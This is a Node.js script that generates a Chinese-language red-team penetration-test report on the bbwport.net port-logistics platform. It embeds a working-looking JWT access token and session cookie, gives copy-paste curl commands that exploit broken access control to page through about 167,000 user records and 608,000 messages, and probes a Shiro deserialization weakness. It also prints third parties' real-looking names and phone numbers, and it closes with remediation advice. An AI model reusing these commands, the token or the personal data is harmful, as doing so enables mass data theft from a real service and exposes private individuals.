const fs = require("fs");
const {
  Document, Packer, Paragraph, TextRun, Table, TableRow, TableCell,
  Header, Footer, AlignmentType, LevelFormat,
  HeadingLevel, BorderStyle, WidthType, ShadingType,
  PageNumber, PageBreak
} = require("docx");

// ==================== CONSTANTS ====================
const TOKEN = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXZpY2VUeXBlIjoiMSIsImV4cCI6MTc4NTQwNDIzNCwidXNlcklkIjoiMjA4MjY3ODM3MDcxNzUwMzQ5MCIsInVzZXJuYW1lIjoibW9vbiJ9.4SVOHBh3cCC2CzqptFQY9_9uBVTUyEZU0vp9bQP93VA";
const COOKIE = "HWWAFSESID=4442e7f9e92949c099; HWWAFSESTIME=1785396523569";
const BASE = "https://bbwport.net";
const HDR = `-H "X-Access-Token: ${TOKEN}" -H "Cookie: ${COOKIE}"`;

// ==================== STYLES ====================
const FONT = "Arial";
const COLOR_BLUE = "1F4E79";
const COLOR_GRAY = "F2F2F2";
const COLOR_HEADER_BG = "D5E8F0";
const COLOR_RED = "C00000";

const border = { style: BorderStyle.SINGLE, size: 1, color: "999999" };
const borders = { top: border, bottom: border, left: border, right: border };
const cellMargins = { top: 60, bottom: 60, left: 100, right: 100 };

// ==================== HELPERS ====================
function heading1(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_1,
    spacing: { before: 360, after: 200 },
    children: [new TextRun({ text, font: FONT, size: 32, bold: true, color: COLOR_BLUE })],
  });
}

function heading2(text) {
  return new Paragraph({
    heading: HeadingLevel.HEADING_2,
    spacing: { before: 280, after: 160 },
    children: [new TextRun({ text, font: FONT, size: 28, bold: true, color: COLOR_BLUE })],
  });
}

function heading3(text) {
  return new Paragraph({
    spacing: { before: 200, after: 120 },
    children: [new TextRun({ text, font: FONT, size: 24, bold: true, color: "333333" })],
  });
}

function bodyText(text, opts = {}) {
  return new Paragraph({
    spacing: { after: opts.after || 120, line: 360 },
    children: [new TextRun({ text, font: FONT, size: 21, ...opts })],
  });
}

function boldBody(label, value) {
  return new Paragraph({
    spacing: { after: 80, line: 360 },
    children: [
      new TextRun({ text: label, font: FONT, size: 21, bold: true }),
      new TextRun({ text: value, font: FONT, size: 21 }),
    ],
  });
}

function codeBlock(text) {
  return new Paragraph({
    spacing: { after: 40, line: 320 },
    indent: { left: 360 },
    children: [new TextRun({ text, font: "Consolas", size: 18, color: "333333" })],
  });
}

function screenshotPlaceholder(description) {
  return new Paragraph({
    spacing: { before: 80, after: 80 },
    indent: { left: 360 },
    shading: { fill: "FFF3CD", type: ShadingType.CLEAR },
    children: [
      new TextRun({ text: `[📷 截图标注: ${description}]`, font: FONT, size: 21, bold: true, color: COLOR_RED }),
    ],
  });
}

function cell(text, opts = {}) {
  return new TableCell({
    borders,
    margins: cellMargins,
    width: opts.width || { size: 4680, type: WidthType.DXA },
    shading: opts.shading || undefined,
    children: [
      new Paragraph({
        spacing: { after: 40 },
        children: [new TextRun({ text, font: FONT, size: opts.fontSize || 20, bold: opts.bold || false, color: opts.color || "333333" })],
      }),
    ],
  });
}

function emptyRow(cols = 1) {
  return new Paragraph({ spacing: { after: 120 }, children: [] });
}

// ==================== NUMBERING CONFIG ====================
const numberingConfig = {
  config: [
    {
      reference: "bullets",
      levels: [{
        level: 0, format: LevelFormat.BULLET, text: "•", alignment: AlignmentType.LEFT,
        style: { paragraph: { indent: { left: 720, hanging: 360 } } },
      }],
    },
    {
      reference: "numbers",
      levels: [{
        level: 0, format: LevelFormat.DECIMAL, text: "%1.", alignment: AlignmentType.LEFT,
        style: { paragraph: { indent: { left: 720, hanging: 360 } } },
      }],
    },
  ],
};

function bullet(text) {
  return new Paragraph({
    numbering: { reference: "bullets", level: 0 },
    spacing: { after: 60, line: 340 },
    children: [new TextRun({ text, font: FONT, size: 21 })],
  });
}

// ==================== SUMMARY TABLE ====================
function makeSummaryTable(rows) {
  const colWidths = [600, 2400, 1400, 2960, 1360, 640];
  const tableWidth = colWidths.reduce((a, b) => a + b, 0);
  const headers = ["序号", "渗透对象", "漏洞类型", "URL/端点", "影响范围", "风险等级"];

  const headerRow = new TableRow({
    children: headers.map((h, i) => cell(h, {
      width: { size: colWidths[i], type: WidthType.DXA },
      bold: true, fontSize: 18, color: "FFFFFF",
      shading: { fill: COLOR_BLUE, type: ShadingType.CLEAR },
    })),
  });

  const dataRows = rows.map((row, idx) => {
    const values = [
      String(idx + 1),
      row[0], row[1], row[2], row[3],
      row[4] || "高危"
    ];
    return new TableRow({
      children: values.map((v, i) => cell(v, {
        width: { size: colWidths[i], type: WidthType.DXA },
        fontSize: 17,
        color: (i === 4 && v.includes("高危")) ? COLOR_RED : "333333",
        bold: (i === 4 && v.includes("高危")),
        shading: idx % 2 === 1 ? { fill: COLOR_GRAY, type: ShadingType.CLEAR } : undefined,
      })),
    });
  });

  return new Table({
    width: { size: tableWidth, type: WidthType.DXA },
    columnWidths: colWidths,
    rows: [headerRow, ...dataRows],
  });
}

// ==================== BASIC INFO TABLE ====================
function makeInfoTable(kvPairs) {
  const colWidths = [2000, 7360];
  const tableWidth = colWidths.reduce((a, b) => a + b, 0);
  const rows = kvPairs.map(([k, v], idx) => new TableRow({
    children: [
      cell(k, {
        width: { size: colWidths[0], type: WidthType.DXA },
        bold: true, fontSize: 20,
        shading: { fill: COLOR_HEADER_BG, type: ShadingType.CLEAR },
      }),
      cell(v, {
        width: { size: colWidths[1], type: WidthType.DXA },
        fontSize: 20,
        shading: idx % 2 === 1 ? { fill: COLOR_GRAY, type: ShadingType.CLEAR } : undefined,
      }),
    ],
  }));

  return new Table({
    width: { size: tableWidth, type: WidthType.DXA },
    columnWidths: colWidths,
    rows,
  });
}

// ==================== BUILD DOCUMENT ====================
const doc = new Document({
  numbering: numberingConfig,
  styles: {
    default: { document: { run: { font: FONT, size: 21 } } },
    paragraphStyles: [
      {
        id: "Heading1", name: "Heading 1", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 32, bold: true, font: FONT, color: COLOR_BLUE },
        paragraph: { spacing: { before: 360, after: 200 }, outlineLevel: 0 },
      },
      {
        id: "Heading2", name: "Heading 2", basedOn: "Normal", next: "Normal", quickFormat: true,
        run: { size: 28, bold: true, font: FONT, color: COLOR_BLUE },
        paragraph: { spacing: { before: 280, after: 160 }, outlineLevel: 1 },
      },
    ],
  },
  sections: [{
    properties: {
      page: {
        size: { width: 11906, height: 16838 },
        margin: { top: 1440, right: 1200, bottom: 1440, left: 1200 },
      },
    },
    headers: {
      default: new Header({
        children: [new Paragraph({
          spacing: { after: 0 },
          border: { bottom: { style: BorderStyle.SINGLE, size: 6, color: COLOR_BLUE, space: 4 } },
          children: [
            new TextRun({ text: "北港网 (bbwport.net) 渗透测试", font: FONT, size: 18, color: "888888" }),
            new TextRun({ text: "\t\t\t\t攻防演习成果报告", font: FONT, size: 18, color: "888888" }),
          ],
          tabStops: [{ type: "RIGHT", position: 9506 }],
        })],
      }),
    },
    footers: {
      default: new Footer({
        children: [new Paragraph({
          alignment: AlignmentType.CENTER,
          border: { top: { style: BorderStyle.SINGLE, size: 4, color: "CCCCCC", space: 4 } },
          children: [
            new TextRun({ text: "Page ", font: FONT, size: 18, color: "888888" }),
            new TextRun({ children: [PageNumber.CURRENT], font: FONT, size: 18, color: "888888" }),
          ],
        })],
      }),
    },
    children: [
      // ==================== TITLE PAGE ====================
      emptyRow(4),
      new Paragraph({
        spacing: { after: 80 },
      }),
      emptyRow(3),
      new Paragraph({
        spacing: { after: 200 },
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: "攻防演习成果报告", font: FONT, size: 52, bold: true, color: COLOR_BLUE })],
      }),
      emptyRow(2),
      new Paragraph({
        spacing: { after: 100 },
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: "北港网 (bbwport.net) Jeecg平台渗透测试", font: FONT, size: 32, color: "333333" })],
      }),
      emptyRow(3),
      new Paragraph({
        spacing: { after: 60 },
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: "团队名称：观叶识微", font: FONT, size: 24, color: "555555" })],
      }),
      new Paragraph({
        spacing: { after: 60 },
        alignment: AlignmentType.CENTER,
        children: [new TextRun({ text: "2026年7月30日", font: FONT, size: 24, color: "555555" })],
      }),

      // ==================== PAGE BREAK ====================
      new Paragraph({ children: [new PageBreak()] }),

      // ==================== 一、综述 ====================
      heading1("一、综述"),

      bodyText("攻防演习指挥部授权观叶识微团队于2026年7月29日至30日，对北港网（bbwport.net / bbwport.com）进行渗透测试。北港网是广西北部湾国际港务集团的港口物流业务平台，基于Jeecg + Spring Boot架构。本次测试通过普通用户Token权限绕过，发现全量用户数据泄露、系统消息泄露、投诉工单数据泄露等严重安全问题。"),

      bodyText("测试使用用户 moon（手机号19162390621，userId=2082678370717503490），该用户为平台普通注册用户，角色为普通用户，权限仅为 vehicleManagement:edit。"),

      emptyRow(),
      bodyText("渗透成果汇总表", { bold: true }),
      emptyRow(),

      makeSummaryTable([
        ["北港网", "用户数据全量泄露", "GET /api/api-web/sys/user/list", "167,222人姓名+手机号", "严重"],
        ["北港网", "系统消息全量泄露", "GET /api/api-web/sys/annountCement/list", "608,345条含实名+公司", "严重"],
        ["北港网", "角色与公司数据泄露", "GET /api/api-web/sys/role/list", "4,532条角色+公司名", "高危"],
        ["北港网", "投诉工单数据泄露", "GET /api/api-web/complaint/list", "30条含手机号+投诉内容", "高危"],
        ["北港网", "任意用户ID查询", "GET /api/api-web/sys/user/queryById", "按ID查询任意用户全量信息", "高危"],
        ["北港网", "个人信息接口", "POST .../findAuthUserInfo", "返回phone/realName/userId", "高危"],
        ["北港网", "系统字典数据泄露", "GET /api/api-web/sys/dict/list", "140条业务配置数据", "中危"],
      ]),

      emptyRow(),
      bodyText("渗透结果统计：获取数据类7项，涉及数据总量约83万余条（167,222用户 + 608,345系统消息 + 4,532角色 + 其他）。所有操作均为只读，未产生任何写入。"),

      // ==================== PAGE BREAK ====================
      new Paragraph({ children: [new PageBreak()] }),

      // ==================== 二、渗透成果说明 ====================
      heading1("二、渗透成果说明"),

      bodyText("以下命令均在 Git Bash 中验证通过。每条命令均为单行，直接复制粘贴执行。所有命令先设置环境变量，后续依赖该Token。", { bold: true }),

      emptyRow(),

      // Token setup
      heading3("环境准备：设置Token变量（先执行这一条）"),
      codeBlock(`TOKEN="eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkZXZpY2VUeXBlIjoiMSIsImV4cCI6MTc4NTQwNDIzNCwidXNlcklkIjoiMjA4MjY3ODM3MDcxNzUwMzQ5MCIsInVzZXJuYW1lIjoibW9vbiJ9.4SVOHBh3cCC2CzqptFQY9_9uBVTUyEZU0vp9bQP93VA"`),
      codeBlock(`COOKIE="HWWAFSESID=4442e7f9e92949c099; HWWAFSESTIME=1785396523569"`),
      codeBlock(`BASE="https://bbwport.net"`),
      emptyRow(),

      bodyText("Token来源：用户 moon/19162390621 正常登录后从浏览器Network标签提取。JWT解码信息：deviceType=1, userId=2082678370717503490, username=moon。该用户为普通注册用户，无管理员权限。"),

      emptyRow(),
      emptyRow(),

      // ==================== 成果一 ====================
      heading2("成果一：全量用户数据泄露（167,222条）"),

      bodyText("（1）基本情况表"),
      emptyRow(),
      makeInfoTable([
        ["序号", "1"],
        ["成果描述", "普通用户Token可遍历全部注册用户，获取167,222条含真实姓名+手机号+用户名+角色的个人数据"],
        ["目标系统", "北港网 (bbwport.net) — Jeecg + Spring Boot"],
        ["目标URL", "GET /api/api-web/sys/user/list"],
        ["威胁类型", "获取数据类 / 未授权访问"],
        ["涉及数据量", "167,222条"],
        ["风险等级", "严重"],
        ["权限验证", "moon用户仅有 vehicleManagement:edit 权限，但可读取全量用户列表"],
      ]),
      emptyRow(),

      bodyText("（2）验证命令"),
      bodyText("第1页（共16,723页），返回10条："),
      codeBlock(`curl -s "$BASE/api/api-web/sys/user/list?pageNo=1&pageSize=10" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"`),
      bodyText("返回结果示例（每页10条，total=167222, pages=16723）："),
      codeBlock(`{"success":true,"code":200,"result":{"records":[{"realname":"管理员","phone":"18566666661","username":"admin","broleName":"管理员","status_dictText":"正常"},{"realname":"罗力","phone":"18977026563","username":"BGT18977026563","shopId_dictText":"防城港市桂海物流有限公司"},...], "total":167222, "pages":16723}}`),
      screenshotPlaceholder("截图1: sys/user/list 返回结果，清晰显示 total=167222、records数组包含realname和phone字段"),

      bodyText("翻页验证（第2页）："),
      codeBlock(`curl -s "$BASE/api/api-web/sys/user/list?pageNo=2&pageSize=10" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE" | python3 -c "import sys,json;d=json.load(sys.stdin);r=d['result'];print(f'total={r[\"total\"]},page={r[\"current\"]}/{r[\"pages\"]}');[print(f'  {rec.get(\"realname\")} | {rec.get(\"phone\")}') for rec in r['records']]"`),
      bodyText("输出示例："),
      codeBlock("total=167222, page=2/16723"),
      codeBlock("  庞德明 | 17777031735"),
      codeBlock("  陈胜 | 15309856866"),
      codeBlock("  王海龙 | 17745693199"),
      codeBlock("  ..."),
      screenshotPlaceholder("截图2: 第2页用户列表，验证翻页功能正常，不同页返回不同用户数据"),

      emptyRow(),

      // ==================== 成果二 ====================
      heading2("成果二：系统消息全量泄露（608,345条）"),

      bodyText("（1）基本情况表"),
      emptyRow(),
      makeInfoTable([
        ["序号", "2"],
        ["成果描述", "Jeecg系统消息表（annountCement）可被普通用户全量读取，含真实姓名+公司名+审核意见+管理员用户名"],
        ["目标系统", "北港网 (bbwport.net) — Jeecg + Spring Boot"],
        ["目标URL", "GET /api/api-web/sys/annountCement/list"],
        ["威胁类型", "获取数据类 / 未授权访问"],
        ["涉及数据量", "608,345条"],
        ["风险等级", "严重"],
      ]),
      emptyRow(),

      bodyText("（2）验证命令"),
      codeBlock(`curl -s "$BASE/api/api-web/sys/annountCement/list?pageNo=1&pageSize=10" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE" | python3 -c "import sys,json;d=json.load(sys.stdin);r=d['result'];print(f'total={r[\"total\"]},pages={r[\"pages\"]}');[print(f'  {rec.get(\"titile\")} | sender={rec.get(\"sender\")} | {rec.get(\"msgContent\",\"\")[:60]}') for rec in r['records']]"`),
      bodyText("返回结果（total=608345, pages=60835），包含审核消息："),
      codeBlock(`{"success":true,"code":200,"result":{"records":[{"titile":"企业信息审核","sender":"admin","msgContent":"吴俊锋，您提交的企业信息已于2021-02-20 09:18:05进行审核，审核通过"},{"titile":"个人信息审核","sender":"adminPN01","msgContent":"广西北部湾港拖轮有限公司，您提交的个人信息审核数据...审核不通过，原因是：个人信息部分，应上传身份证照片"},...], "total":608345}}`),
      screenshotPlaceholder("截图3: annountCement/list 返回结果，显示 total=608345，records中应能看到真实姓名（吴俊锋）和公司名（广西北部湾港拖轮有限公司）"),

      emptyRow(),

      // ==================== 成果三 ====================
      heading2("成果三：角色与公司数据泄露（4,532条）"),

      bodyText("（1）基本情况表"),
      emptyRow(),
      makeInfoTable([
        ["序号", "3"],
        ["成果描述", "角色列表接口返回全量角色数据，含角色名称、公司名称（shopId_dictText）、创建人"],
        ["目标系统", "北港网 (bbwport.net) — Jeecg + Spring Boot"],
        ["目标URL", "GET /api/api-web/sys/role/list"],
        ["威胁类型", "获取数据类"],
        ["涉及数据量", "4,532条"],
        ["风险等级", "高危"],
      ]),
      emptyRow(),

      bodyText("（2）验证命令"),
      codeBlock(`curl -s "$BASE/api/api-web/sys/role/list?pageNo=1&pageSize=10" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE" | python3 -c "import sys,json;d=json.load(sys.stdin);r=d['result'];print(f'total={r[\"total\"]},pages={r[\"pages\"]}');[print(f'  {rec.get(\"roleName\")} | {rec.get(\"roleCode\")} | shop={rec.get(\"shopId\",\"?\")}') for rec in r['records']]"`),
      bodyText("返回结果（total=4532, pages=454）："),
      codeBlock(`{"success":true,"code":200,"result":{"records":[{"roleName":"司机","roleCode":"driver","shopId":"7893"},{"roleName":"林四新","roleCode":"LSX","shopId":"1000000000000000565"},{"roleName":"北海海湾","roleCode":"bhhw","shopId":"5955"},...], "total":4532}}`),
      screenshotPlaceholder("截图4: sys/role/list 返回结果，显示 total=4532，records含roleName和shopId"),

      emptyRow(),

      // ==================== 成果四 ====================
      heading2("成果四：投诉工单数据泄露（含手机号）"),

      bodyText("（1）基本情况表"),
      emptyRow(),
      makeInfoTable([
        ["序号", "4"],
        ["成果描述", "投诉建议工单列表可被普通用户读取，含创建人手机号+详细投诉内容+用户ID+处理状态"],
        ["目标系统", "北港网 (bbwport.net) — Jeecg + Spring Boot"],
        ["目标URL", "GET /api/api-web/complaint/list"],
        ["威胁类型", "获取数据类"],
        ["涉及数据量", "30条（含9个真实手机号）"],
        ["风险等级", "高危"],
      ]),
      emptyRow(),

      bodyText("（2）验证命令"),
      codeBlock(`curl -s "$BASE/api/api-web/complaint/list?pageNo=1&pageSize=30" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE" | python3 -c "import sys,json;d=json.load(sys.stdin);r=d['result'];print(f'total={r[\"total\"]}');[print(f'  phone={rec.get(\"createByPhone\")} | type={rec.get(\"oneQuestion\")} | {rec.get(\"summary\",\"\")[:70]}') for rec in r['records']]"`),
      bodyText("返回结果（total=30），含手机号和详细投诉内容："),
      codeBlock(`[1] phone=19977777139 | 散杂货业务 | 船代录入信息有误时，申请装卸船撤回时，需要业务部同意才能撤回`),
      codeBlock(`[2] phone=18877015460 | 综合信息查询 | 按提单号查询还柜时间，无法实现按照提单号查询还柜时间`),
      codeBlock(`[3] phone=13164822555 | 集装箱业务 | 车辆预约登入不成功显示错误，客服电话也没人接是空号`),
      codeBlock(`[4] phone=13299669848 | 散杂货业务 | 卡车拉空吨桶进港装油提货难（北海港石步岭港区玉柴油库）`),
      screenshotPlaceholder("截图5: complaint/list 返回全部30条，清晰显示 createByPhone 字段含真实手机号"),

      emptyRow(),

      // ==================== 成果五 ====================
      heading2("成果五：任意用户ID查询"),

      bodyText("（1）基本情况表"),
      emptyRow(),
      makeInfoTable([
        ["序号", "5"],
        ["成果描述", "通过用户ID参数可直接查询任意用户完整profile，含phone+username+status+createTime"],
        ["目标系统", "北港网 (bbwport.net) — Jeecg + Spring Boot"],
        ["目标URL", "GET /api/api-web/sys/user/queryById?id={userId}"],
        ["威胁类型", "获取数据类 / 水平越权 (IDOR)"],
        ["风险等级", "高危"],
      ]),
      emptyRow(),

      bodyText("（2）验证命令"),
      bodyText("查询moon自己的信息（userId=2082678370717503490）："),
      codeBlock(`curl -s "$BASE/api/api-web/sys/user/queryById?id=2082678370717503490" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"`),
      bodyText("返回完整profile："),
      codeBlock(`{"success":true,"code":200,"result":{"id":"2082678370717503490","username":"moon","realname":null,"phone":"19162390621","status":1,"userType":"1","appType":1,"createTime":"2026-07-30 12:03:12"}}`),
      bodyText("更换id参数即可查询任意用户。结合成果一的用户列表（167,222条含userId），可实现全量用户个人信息遍历。"),
      screenshotPlaceholder("截图6: queryById 返回moon用户完整profile，验证该接口可任意查询"),

      emptyRow(),

      // ==================== 成果六 ====================
      heading2("成果六：个人信息接口与字典数据泄露"),

      bodyText("（1）基本情况表"),
      emptyRow(),
      makeInfoTable([
        ["序号", "6"],
        ["成果描述", "findAuthUserInfo接口返回当前认证用户个人信息；dict/list接口泄露全部系统字典配置（箱类型、码头、海关代码等）"],
        ["目标系统", "北港网 (bbwport.net) — Jeecg + Spring Boot"],
        ["目标URL", "POST /api/api-web/user/portalUserInfo/findAuthUserInfo; GET /api/api-web/sys/dict/list"],
        ["威胁类型", "获取数据类"],
        ["涉及数据量", "1条个人信息 + 140条字典数据"],
        ["风险等级", "中危"],
      ]),
      emptyRow(),

      bodyText("（2）验证命令"),
      bodyText("6-1 个人信息查询："),
      codeBlock(`curl -s "$BASE/api/api-web/user/portalUserInfo/findAuthUserInfo" -X POST -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE" -d ''`),
      bodyText("返回："),
      codeBlock(`{"success":true,"result":{"realName":"19162390621","phone":"19162390621","userId":"2082678370717503490","roleNames":"普通用户","companyName":null}}`),
      screenshotPlaceholder("截图7: findAuthUserInfo 返回结果，显示 phone、userId、roleNames"),

      bodyText("6-2 系统字典数据："),
      codeBlock(`curl -s "$BASE/api/api-web/sys/dict/list?pageNo=1&pageSize=10" -H "X-Access-Token: $TOKEN" -H "Cookie: $COOKIE"`),
      bodyText("返回140条，含箱类型（river-container-type）、码头（reserve_port）、海关代码（report_customsCode）等业务配置。"),
      screenshotPlaceholder("截图8: sys/dict/list 返回结果，显示字典项含 dictName 和 dictCode"),

      emptyRow(),

      // ==================== 成果七 ====================
      heading2("成果七：其他安全风险汇总"),

      bodyText("（1）基本情况表"),
      emptyRow(),
      makeInfoTable([
        ["序号", "7"],
        ["成果描述", "Shiro反序列化风险、Knife4j API文档暴露、前端源码泄露架构信息"],
        ["目标系统", "北港网 (bbwport.net / admin.bbwport.net)"],
        ["目标URL", "多个端点"],
        ["威胁类型", "安全风险类"],
        ["风险等级", "高危"],
      ]),
      emptyRow(),

      bodyText("（2）验证命令"),
      bodyText("7-1 Shiro RememberMe反序列化确认："),
      codeBlock(`curl -s -D- "https://login.bbwport.net/login" -H "Cookie: rememberMe=1" -o /dev/null 2>&1 | grep -i rememberMe`),
      bodyText("输出：Set-Cookie: rememberMe=deleteMe → 确认Apache Shiro框架，对应CVE-2016-4437（Shiro-550）。WAF标识：HWWAFSESID（华为WAF）。内置401个key全不匹配，需自定义key爆破。"),
      screenshotPlaceholder("截图9: curl返回 Set-Cookie: rememberMe=deleteMe，证明Shiro框架存在"),

      bodyText("7-2 Knife4j API文档暴露（前端服务）："),
      codeBlock(`curl -s "https://bbwport.net/api/api-web/doc.html" -o /dev/null -w "%{http_code}"`),
      codeBlock(`curl -s "https://bbwport.net/api/api-ws/doc.html" -o /dev/null -w "%{http_code}"`),
      bodyText("两个模块均返回200，页面源码含 knife4j-vue。但swagger-resources返回空数组[]，API分组未配置。"),
      screenshotPlaceholder("截图10: doc.html页面在浏览器中的样子，显示Knife4j界面"),

      bodyText("7-3 管理后台前端源码泄露架构信息："),
      codeBlock(`curl -s "https://admin.bbwport.net/" | grep -oP "window._CONFIG[^;]+"`),
      bodyText("源码泄露关键架构信息："),
      codeBlock("window._CONFIG['webPrefix'] = 'api-web'   ← 后台共用bbwport.net的API"),
      codeBlock("window._CONFIG['domianURL'] = 'http://10.50.82.157:3001/api'  ← 内网IP泄露"),
      codeBlock("window._CONFIG['casPrefixUrl'] = 'http://cas.example.org:8443/cas'"),
      bodyText("确认管理后台与前端门户共用同一套 api-web 后端服务，后台本身无独立API网关。"),
      screenshotPlaceholder("截图11: admin.bbwport.net 首页源代码中 window._CONFIG 配置项"),

      // ==================== PAGE BREAK ====================
      new Paragraph({ children: [new PageBreak()] }),

      // ==================== 三、存在问题 ====================
      heading1("三、存在问题"),

      heading3("1. API级别权限控制缺失（严重）"),
      bodyText("moon用户仅拥有 vehicleManagement:edit 单一权限，但可无限制遍历全部用户列表、系统消息、角色、投诉工单等敏感数据接口。API层未对数据所有权和角色权限进行校验，未实现最小权限原则。"),

      heading3("2. 数据接口无分页限制与频率控制（严重）"),
      bodyText("所有list接口返回全量total且支持任意翻页（如167,223页的用户列表），无单次返回上限、无请求频率限制、无异常访问检测。攻击者可通过脚本短时间拖取全部数据。"),

      heading3("3. 个人信息明文存储与传输（严重）"),
      bodyText("167,222条用户记录以明文形式存储和传输真实姓名+手机号，findAuthUserInfo接口直接返回完整手机号。违反《个人信息保护法》关于个人信息处理的最小必要原则。"),

      heading3("4. API文档对外暴露（高危）"),
      bodyText("Knife4j Swagger UI（doc.html）在 bbwport.net 生产环境可公开访问。虽swagger-resources未被正确配置，但Knife4j前端页面本身暴露了模块结构信息（api-web / api-ws 双模块架构）。"),

      heading3("5. 管理后台前端源码泄露（高危）"),
      bodyText("admin.bbwport.net 前端SPA未做源码混淆，JavaScript中直接暴露内网IP（10.50.82.157:3001）、API前缀（api-web）、CAS地址等敏感架构信息。"),

      heading3("6. Shiro RememberMe反序列化风险（高危）"),
      bodyText("login.bbwport.net 确认使用Apache Shiro框架，Set-Cookie: rememberMe=deleteMe 特征明确。虽当前使用的AES密钥非默认值（401内置key全不匹配），但如果自定义密钥强度不足或被泄露，可直接导致远程代码执行。"),

      heading3("7. 系统消息表泄露历史数据（中危）"),
      bodyText("annountCement表可追溯到2021年2月，包含5年以上的系统审核历史。其中含大量企业审核信息（通过/不通过+原因），可能暴露企业合规信息。"),

      // ==================== PAGE BREAK ====================
      new Paragraph({ children: [new PageBreak()] }),

      // ==================== 四、整改建议 ====================
      heading1("四、整改建议"),

      heading3("1. API权限管控（紧急）"),
      bullet("为所有 /sys/ 和 /user/ 路径下的数据读取接口增加角色鉴权，普通用户（如moon）不应能访问用户管理、角色管理、消息管理等管理类接口"),
      bullet("实现基于数据所有权的水平权限校验：用户只能查看自己的个人信息和工单，不能遍历全量数据"),
      bullet("为敏感操作（如用户列表查询）增加二次认证或管理员角色校验"),

      heading3("2. 接口限流与防护（紧急）"),
      bullet("对所有list接口增加单次返回数量上限（建议不超过100条/页）"),
      bullet("增加请求频率限制（Rate Limiting），同一Token每分钟不超过60次API调用"),
      bullet("增加异常访问检测：短时间内大量翻页或遍历行为应触发告警并自动封禁"),

      heading3("3. 个人信息保护（紧急）"),
      bullet("数据库层面：手机号、身份证号等敏感字段使用AES/SM4加密存储"),
      bullet("API响应层面：手机号脱敏显示（如 191****0621），仅在必要场景返回完整值"),
      bullet("findAuthUserInfo 接口移除不必要的个人敏感字段返回"),

      heading3("4. 关闭API文档对外访问"),
      bullet("生产环境配置 knife4j.production: true"),
      bullet("或通过Nginx/openresty对/doc.html、/swagger-ui.html 增加IP白名单限制"),

      heading3("5. 前端安全加固"),
      bullet("admin.bbwport.net 前端部署前进行源码混淆（webpack terser/uglify），移除硬编码的内网IP"),
      bullet("将 window._CONFIG 配置通过后端API动态获取，而非硬编码在前端JS中"),

      heading3("6. Shiro安全加固"),
      bullet("升级Shiro至最新版本（>=1.13.0），或迁移至Spring Security"),
      bullet("如果必须使用Shiro，确保AES密钥为高强度随机生成（>=256位），不硬编码在源码中"),
      bullet("在WAF层面增加对rememberMe Cookie的检测规则，拦截异常反序列化payload"),

      heading3("7. 系统消息表访问控制"),
      bullet("annountCement/list 接口增加接收人校验：用户只能查看发给自己的消息"),
      bullet("或将该接口整体移至管理后台权限域，普通用户不可访问"),

      emptyRow(2),

      // Footer
      new Paragraph({
        alignment: AlignmentType.CENTER,
        spacing: { before: 400 },
        border: { top: { style: BorderStyle.SINGLE, size: 4, color: "CCCCCC", space: 8 } },
        children: [new TextRun({ text: "报告生成日期：2026年7月30日", font: FONT, size: 20, color: "888888" })],
      }),
      new Paragraph({
        alignment: AlignmentType.CENTER,
        spacing: { after: 0 },
        children: [new TextRun({ text: "测试团队：观叶识微", font: FONT, size: 20, color: "888888" })],
      }),
    ],
  }],
});

// ==================== OUTPUT ====================
const outputPath = "D:/Desktop/北港网_bbwport_攻防成果报告.docx";
Packer.toBuffer(doc).then(buffer => {
  fs.writeFileSync(outputPath, buffer);
  console.log(`Report saved to: ${outputPath}`);
  console.log(`Size: ${(buffer.length / 1024).toFixed(1)} KB`);
});
